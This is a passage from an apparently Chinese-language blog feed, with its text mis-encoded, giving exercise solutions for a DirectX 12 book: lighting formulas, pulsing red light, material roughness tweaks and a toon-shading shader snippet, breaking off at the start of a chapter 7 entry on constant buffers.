transform="translate(14220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å¤¹</text></g><g data-mml-node="mi" transform="translate(15220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">è§’</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-7700)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-9100)"><g data-mml-node="mtd" transform="translate(762.8,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D445" xlink:href="#MJX-1-TEX-I-1D445"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D439" xlink:href="#MJX-1-TEX-I-1D439"></use></g></g></g><g data-mml-node="mo" transform="translate(1371.6,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="msub" transform="translate(1760.6,0)"><g data-mml-node="mi"><use data-c="1D6FC" xlink:href="#MJX-1-TEX-I-1D6FC"></use></g><g data-mml-node="TeXAtom" transform="translate(673,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mo" transform="translate(2890.9,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mo" transform="translate(3557.7,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(4113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ ¹</text></g><g data-mml-node="mi" transform="translate(5113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ®</text></g><g data-mml-node="mi" transform="translate(6113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">è²</text></g><g data-mml-node="mi" transform="translate(7113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ¶…</text></g><g data-mml-node="mi" transform="translate(8113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å°”</text></g><g data-mml-node="mi" transform="translate(9113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ•ˆ</text></g><g data-mml-node="mi" transform="translate(10113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">åº”</text></g><g data-mml-node="mi" transform="translate(11113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ï¼Œ</text></g><g data-mml-node="mi" transform="translate(12113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…³</text></g><g data-mml-node="mi" transform="translate(13113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">äº</text></g><g data-mml-node="mi" transform="translate(14113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¸­</text></g><g data-mml-node="mi" transform="translate(15113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é—´</text></g><g data-mml-node="mi" transform="translate(16113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å‘</text></g><g data-mml-node="mi" transform="translate(17113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g><g data-mml-node="mi" transform="translate(18113.5,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="mi" transform="translate(18689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ‰€</text></g><g data-mml-node="mi" transform="translate(19689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å</text></g><g data-mml-node="mi" transform="translate(20689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å°„</text></g><g data-mml-node="mi" transform="translate(21689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">åˆ°</text></g><g data-mml-node="mi" transform="translate(22689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">è§‚</text></g><g data-mml-node="mi" transform="translate(23689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å¯Ÿ</text></g><g data-mml-node="mi" transform="translate(24689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">è€…</text></g><g data-mml-node="mi" transform="translate(25689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çœ¼</text></g><g data-mml-node="mi" transform="translate(26689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¸­</text></g><g data-mml-node="mi" transform="translate(27689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çš„</text></g><g data-mml-node="mi" transform="translate(28689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å…‰</text></g><g data-mml-node="mi" transform="translate(29689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-10500)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-11900)"><g data-mml-node="mtd" transform="translate(11751.8,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mo" transform="translate(1155.8,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ§</text></g><g data-mml-node="mi" transform="translate(2711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">åˆ¶</text></g><g data-mml-node="mi" transform="translate(3711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">è¡¨</text></g><g data-mml-node="mi" transform="translate(4711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é¢</text></g><g data-mml-node="mi" transform="translate(5711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ç²—</text></g><g data-mml-node="mi" transform="translate(6711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ç³™</text></g><g data-mml-node="mi" transform="translate(7711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">åº¦</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-13300)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-14700)"><g data-mml-node="mtd" transform="translate(933,0)"><g data-mml-node="mo"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(389,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(1211.2,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(1711.4,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="msup" transform="translate(2287.4,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g></g></g><g data-mml-node="mo" transform="translate(3658.1,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(4213.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æŒ‡</text></g><g data-mml-node="mi" transform="translate(5213.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å®š</text></g><g data-mml-node="mi" transform="translate(6213.8,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="mi" transform="translate(6789.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å’Œ</text></g><g data-mml-node="mi" transform="translate(7789.8,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mi" transform="translate(8389.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¹‹</text></g><g data-mml-node="mi" transform="translate(9389.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é—´</text></g><g data-mml-node="msub" transform="translate(10389.8,0)"><g data-mml-node="mi"><use data-c="1D703" xlink:href="#MJX-1-TEX-I-1D703"></use></g><g data-mml-node="TeXAtom" transform="translate(502,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mi" transform="translate(11349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çš„</text></g><g data-mml-node="mi" transform="translate(12349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ‰€</text></g><g data-mml-node="mi" transform="translate(13349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æœ‰</text></g><g data-mml-node="mi" transform="translate(14349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å¾®</text></g><g data-mml-node="mi" transform="translate(15349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å¹³</text></g><g data-mml-node="mi" transform="translate(16349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é¢</text></g><g data-mml-node="mi" transform="translate(17349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ç‰‡</text></g><g data-mml-node="mi" transform="translate(18349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ®µ</text></g><g data-mml-node="mi" transform="translate(19349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çš„</text></g><g data-mml-node="mi" transform="translate(20349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">åˆ†</text></g><g data-mml-node="mi" transform="translate(21349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å¸ƒ</text></g><g data-mml-node="mi" transform="translate(22349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æƒ…</text></g><g data-mml-node="mi" transform="translate(23349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å†µ</text></g><g data-mml-node="mi" transform="translate(24349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ï¼ˆ</text></g><g data-mml-node="mi" transform="translate(25349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ‰€</text></g><g data-mml-node="mi" transform="translate(26349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å </text></g><g data-mml-node="mi" transform="translate(27349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ¯”</text></g><g data-mml-node="mi" transform="translate(28349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¾‹</text></g><g data-mml-node="mi" transform="translate(29349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ï¼‰</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-16100)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-17618.9)"><g data-mml-node="mtd" transform="translate(1708.5,0)"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220,398) scale(0.707)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mo" transform="translate(878,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="mn" transform="translate(1656,0)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g></g><g data-mml-node="mn" transform="translate(805.5,-345) scale(0.707)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g><rect width="1724.5" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(2242.3,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mstyle" transform="translate(2520.3,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(3798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é•œ</text></g><g data-mml-node="mi" transform="translate(4798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é¢</text></g><g data-mml-node="mi" transform="translate(5798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å</text></g><g data-mml-node="mi" transform="translate(6798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å°„</text></g><g data-mml-node="mi" transform="translate(7798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">è¿‡</text></g><g data-mml-node="mi" transform="translate(8798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ç¨‹</text></g><g data-mml-node="mi" transform="translate(9798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¸­</text></g><g data-mml-node="mi" transform="translate(10798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ï¼Œ</text></g><g data-mml-node="mi" transform="translate(11798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¸º</text></g><g data-mml-node="mi" transform="translate(12798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">äº†</text></g><g data-mml-node="mi" transform="translate(13798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ¨¡</text></g><g data-mml-node="mi" transform="translate(14798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ‹Ÿ</text></g><g data-mml-node="mi" transform="translate(15798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">èƒ½</text></g><g data-mml-node="mi" transform="translate(16798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡</text></g><g data-mml-node="mi" transform="translate(17798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å®ˆ</text></g><g data-mml-node="mi" transform="translate(18798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ’</text></g><g data-mml-node="mi" transform="translate(19798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">æ‰€</text></g><g data-mml-node="mi" transform="translate(20798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">é‡‡</text></g><g data-mml-node="mi" transform="translate(21798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ç”¨</text></g><g data-mml-node="mi" transform="translate(22798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">çš„</text></g><g data-mml-node="mi" transform="translate(23798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å½’</text></g><g data-mml-node="mi" transform="translate(24798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">ä¸€</text></g><g data-mml-node="mi" transform="translate(25798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">åŒ–</text></g><g data-mml-node="mi" transform="translate(26798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å› </text></g><g data-mml-node="mi" transform="translate(27798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">å­</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-19129.5)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g></g></g></g></svg></mjx-container>



<p>åœ¨ä¹¦ä¸­çš„ç€è‰²å™¨ä»£ç ä¸­ä¹Ÿæ§åˆ¶äº† nÂ·h éè´Ÿ</p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>ä¸€äº›åè¯<br>å…‰æ³½åº¦ï¼ˆshininessï¼‰ç²’åº¦ï¼ˆgranularityï¼‰</p>
<h2 id="16-1"><a href="#16-1" class="headerlink" title="16.1"></a>16.1</h2><p>Modify the lighting demo of this chapter so that the directional light only emits mostly red light. In addition, make the strength of the light oscillate as a function of time using the sine function so that the light appears to pulse. Using colored and pulsing lights can be useful for different game moods; for example, a pulsing red light might be used to signify emergency situations</p>
<p>ä¸Šä¼ å‰æ”¹ä¸ªå¸¸é‡ç¼“å†²åŒºæ•°æ®ï¼ŒmMainPassCB.Lights[0].Strength &#x3D; { fabsf(sinf(20*gt.TotalTime())), 0.0f, 0.0f };<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/GIF-2022-3-17-13-30-23.gif" alt="GIF 2022-3-17 13-30-23"></p>
<h2 id="16-2"><a href="#16-2" class="headerlink" title="16.2"></a>16.2</h2><p>Modify the lighting demo of this chapter by changing the roughness in the materials</p>
<p>è°ƒæ•´ç²—ç³™åº¦ï¼ŒmatConstants.Roughness ä¿®æ”¹è¿™ä¸ªå³å¯ï¼Œç¨å¾®æ¯”å¯¹ä¸€ä¸‹ 1.0f ä¸ 0.0f çš„åŒºåˆ«</p>
<p>ä»¥ä¸‹æœ‰ç‚¹å·æ‡’ï¼Œå…¶å®æ˜¯è¦å»æ”¹æè´¨çš„ï¼Œæˆ‘ç›´æ¥æ”¹äº†æ‰€æœ‰çš„ã€‚åªå¯¹ä¸€ä¸ªä¿®æ”¹åªéœ€è¦åœ¨ LitColumnsApp::BuildMaterials ä¸­ä¿®æ”¹å³å¯ã€‚</p>
<p>Roughness &#x3D; 0.0f</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317134809061.png" alt="image-1.0f"></p>
<p>Roughness &#x3D; 1.0f</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317134844373.png" alt="image-20220317134844373"></p>
<p>è¿™ä¸ªç²—ç³™åº¦ç»™äººæ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªã€‚ç”±äº R0 è¿˜æ˜¯æŒºé«˜çš„ï¼Œåå°„å…‰é‡ä¹Ÿå¾ˆé«˜ï¼Œçœ‹èµ·æ¥ä¸é‚£ä¹ˆç²—ç³™ã€‚</p>
<p>Roughness &#x3D; 1.0f , matConstants.FresnelR0 &#x3D; DirectX::XMFLOAT3(0.0f,0.0f,0.0f);</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317135252971.png" alt="image-20220317135252971"></p>
<p>è¿™æ ·å­ç¡®å®æ˜¯ç²—ç³™äº†ç‚¹ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆèµ°æ ·æœ‰ç‚¹æ˜æ˜¾ã€‚</p>
<h2 id="16-3"><a href="#16-3" class="headerlink" title="16.3"></a>16.3</h2><p>ä¸‰ç‚¹å¸ƒå…‰ã€‚å…·ä½“åº”è¯¥æ€ä¹ˆæ‰“å…‰åº”è¯¥æŸ¥ä¸€ä¸‹èµ„æ–™ï¼Œè¿™é‡Œäº†è§£ä¸€ä¸‹æ¦‚å¿µå³å¯ã€‚</p>
<h2 id="â€”"><a href="#â€”" class="headerlink" title="â€”"></a>â€”</h2><p>ç•¥</p>
<h2 id="16-6"><a href="#16-6" class="headerlink" title="16.6"></a>16.6</h2><p>One characteristic of cartoon styled lighting is the abrupt transition from one color shade to the next (in contrast with a smooth transition) as shown in Figure 8.30. This can be implemented by computing kd and ks in the usual way, but then transforming them by discrete functions like the following before using them in the pixel shader: Modify the lighting demo of this chapter to use this sort of toon shading. (Note: The functions f and g above are just sample functions to start with, and can be tweaked until you get the results you want.)</p>
<p>å¡é€šé£æ ¼ï¼Œä¹¦ä¸­çš„ä¾‹å­å¯ä»¥é€šè¿‡ä¿®æ”¹ç€è‰²å™¨ä»£ç å®ç°ï¼Œä¸è¿‡æ·»åŠ äº†åˆ†æ”¯ï¼Œä¸å¤ªå¥½ã€‚</p>
<p>æ°´æµçš„æ•ˆæœåªç”¨äº†ä¸€ä¸ªç›´æ¥å…‰ï¼Œé‚£æˆ‘å°±æ”¹ä¸€ä¸‹é‚£ä¸ªçœ‹çœ‹ã€‚</p>
<pre class="line-numbers language-glsl" data-language="glsl"><code class="language-glsl"><span class="token comment">// å¦‚æœæ²¡æœ‰æŠŠæ‰€æœ‰å¯èƒ½åŒ…å«è¿›å»ä¼šæŠ¥é”™ï¼Œä¸æ˜¯å¾ˆç†è§£æˆå› </span>
<span class="token keyword">float</span> <span class="token function">kdtrans</span><span class="token punctuation">(</span><span class="token keyword">float</span> kd<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>kd <span class="token operator">&lt;=</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.4f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>kd <span class="token operator">&lt;=</span> <span class="token number">0.5f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.6f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>kd <span class="token operator">&lt;=</span> <span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">1.0f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">1.0f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">float</span> <span class="token function">kstrans</span><span class="token punctuation">(</span><span class="token keyword">float</span> ks<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>ks <span class="token operator">&lt;=</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ks <span class="token operator">&lt;=</span> <span class="token number">0.1f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ks <span class="token operator">&lt;=</span> <span class="token number">0.8f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.5f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ks <span class="token operator">&lt;=</span> <span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.8f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.8f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//ä¿®æ”¹ç›´æ¥å…‰æ¨¡å‹</span>
<span class="token keyword">float</span> ndotl <span class="token operator">=</span> <span class="token function">kdtrans</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">dot</span><span class="token punctuation">(</span>lightVec<span class="token punctuation">,</span> normal<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//ä¿®æ”¹BlinnPhongæ¨¡å‹</span>
<span class="token keyword">float</span> roughnessFactor <span class="token operator">=</span> <span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">8.0f</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">kstrans</span><span class="token punctuation">(</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">dot</span><span class="token punctuation">(</span>halfVec<span class="token punctuation">,</span> normal<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8.0f</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ²¡æœ‰ä½¿ç”¨å¡é€šé£æ ¼</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317141646375.png" alt="image-20220317141646375"></p>
<p>å¡é€šé£æ ¼</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317142548686.png" alt="image-20220317142548686"></p>
]]></content>
      <categories>
        <category>DX12</category>
      </categories>
      <tags>
        <tag>directX 12</tag>
        <tag>å›¾å½¢å­¦</tag>
      </tags>
  </entry>
  <entry>
    <title>DX12 ç¬¬ä¸ƒç« ä¹ é¢˜</title>
    <url>/2022/03/16/d3d12-7/</url>
    <content><![CDATA[<h1 id="DX12-7th"><a href="#DX12-7th" class="headerlink" title="DX12-7th"></a>DX12-7th</h1><h2 id="7th-Capture"><a href="#7th-Capture" class="headerlink" title="7th Capture"></a>7th Capture</h2><h3 id="something-before-7"><a href="#something-before-7" class="headerlink" title="something before 7"></a>something before 7</h3><p>è®°å¿†è¢«æ¸…ç©ºäº†ï¼Œæœ‰ç‚¹æä¸æ‡‚ worldViewProj æ˜¯æ€ä¹ˆäº§ç”Ÿçš„äº†ï¼Œè¿˜æœ‰ cb æ˜¯æ€ä¹ˆç»‘å®šçš„ï¼Ÿ</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">world å°±æ˜¯ç‰©ä½“åœ¨ä¸–ç•Œç©ºé—´çš„ä½ç½®
view æ˜¯ç‰©ä½“ä»ä¸–ç•Œç©ºé—´ï¼Œå˜æ¢åˆ°æ‘„åƒæœºç©ºé—´ï¼ˆè§†å¯Ÿç©ºé—´ï¼‰çš„çŸ©é˜µ
Proj åˆ™æ˜¯ç‰©ä½“åœ¨è§†å¯Ÿç©ºé—´ä¸­æ˜ å°„åˆ°äºŒç»´å¹³é¢ä¸Šçš„çŸ©é˜µ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>constant buffer çš„ç»‘å®šè¿‡ç¨‹ï¼Œä»¥ä¸‹æ˜¯éœ€è¦ç»‘å®šçš„ç»“æ„ä½“</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// éœ€è¦ç»‘å®šçš„ CB</span>
<span class="token keyword">struct</span> <span class="token class-name">ObjectConstants</span>
<span class="token punctuation">&#123;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 World <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">PassConstants</span>
<span class="token punctuation">&#123;</span>
